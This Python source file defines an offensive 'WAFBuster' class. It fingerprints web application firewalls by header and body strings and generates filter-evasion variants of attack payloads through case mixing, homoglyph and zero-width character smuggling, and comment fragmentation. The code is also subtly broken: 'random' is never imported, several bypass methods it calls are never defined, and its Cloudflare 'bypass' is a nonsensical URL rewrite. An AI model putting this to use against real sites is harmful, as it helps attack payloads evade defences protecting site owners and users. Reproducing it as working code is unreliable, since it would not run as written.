import re
from typing import Optional, List

class WAFBuster:
    def __init__(self):
        self.waf_fingerprints = {
            'cloudflare': ['__cfduid', 'cf-ray', 'server', 'cloudflare'],
            'akamai': ['akamai', 'x-akamai'],
            'imperva': ['incap_ses_', 'visid_incap_'],
            'aws_waf': ['aws-waf', 'x-aws-waf'],
            'mod_security': ['mod_security', 'libmodsecurity'],
        }
        
        self.bypass_techniques = {
            'case_variation': lambda x: self._case_variation(x),
            'unicode_smuggling': lambda x: self._unicode_smuggling(x),
            'parameter_pollution': lambda x: self._parameter_pollution(x),
            'chunked_encoding': lambda x: self._chunked_encoding(x),
            'multipart_form': lambda x: self._multipart_form(x),
        }
    
    def detect(self, headers: dict, body: str = "") -> Optional[str]:
        """Detect WAF from headers and response."""
        for waf, fingerprints in self.waf_fingerprints.items():
            for fingerprint in fingerprints:
                for header, value in headers.items():
                    if fingerprint.lower() in header.lower() or fingerprint.lower() in value.lower():
                        return waf
                
                if fingerprint.lower() in body.lower():
                    return waf
        return None
    
    def generate_bypass_payloads(self, original_payload: str, waf_type: str) -> List[str]:
        """Generate WAF-specific bypass payloads."""
        payloads = [original_payload]
        
        # Generic bypasses
        for technique_name, technique in self.bypass_techniques.items():
            payloads.append(technique(original_payload))
        
        # WAF-specific bypasses
        if waf_type == 'cloudflare':
            payloads.extend(self._cloudflare_bypass(original_payload))
        elif waf_type == 'mod_security':
            payloads.extend(self._modsecurity_bypass(original_payload))
        
        return payloads
    
    def _case_variation(self, payload: str) -> str:
        """Vary case to bypass case-sensitive filters."""
        chars = list(payload)
        for i in range(len(chars)):
            if chars[i].isalpha() and random.random() > 0.5:
                chars[i] = chars[i].upper() if random.random() > 0.5 else chars[i].lower()
        return ''.join(chars)
    
    def _unicode_smuggling(self, payload: str) -> str:
        """Use unicode homoglyphs and zero-width characters."""
        replacements = {
            'a': 'а',  # cyrillic
            'e': 'е',
            'o': 'о',
            'p': 'р',
            'c': 'с',
            "'": 'ʻ',  # U+02BB
            '"': '″',
            '<': '＜',
            '>': '＞',
        }
        
        result = payload
        for orig, repl in replacements.items():
            if random.random() > 0.7:
                result = result.replace(orig, repl)
        
        # Add zero-width spaces randomly
        if random.random() > 0.5:
            pos = random.randint(1, len(result)-1)
            result = result[:pos] + '\u200b' + result[pos:]
        
        return result
    
    def _cloudflare_bypass(self, payload: str) -> List[str]:
        """Cloudflare-specific bypass techniques."""
        bypasses = []
        
        # Use Cloudflare's own CDN URLs
        if 'http' in payload:
            bypasses.append(payload.replace('http://', 'https://cdnjs.cloudflare.com/ajax/libs/'))
        
        # Cloudflare often blocks specific patterns, try fragmentation
        if len(payload) > 10:
            mid = len(payload) // 2
            bypasses.append(payload[:mid] + '/*comment*/' + payload[mid:])
        
        return bypasses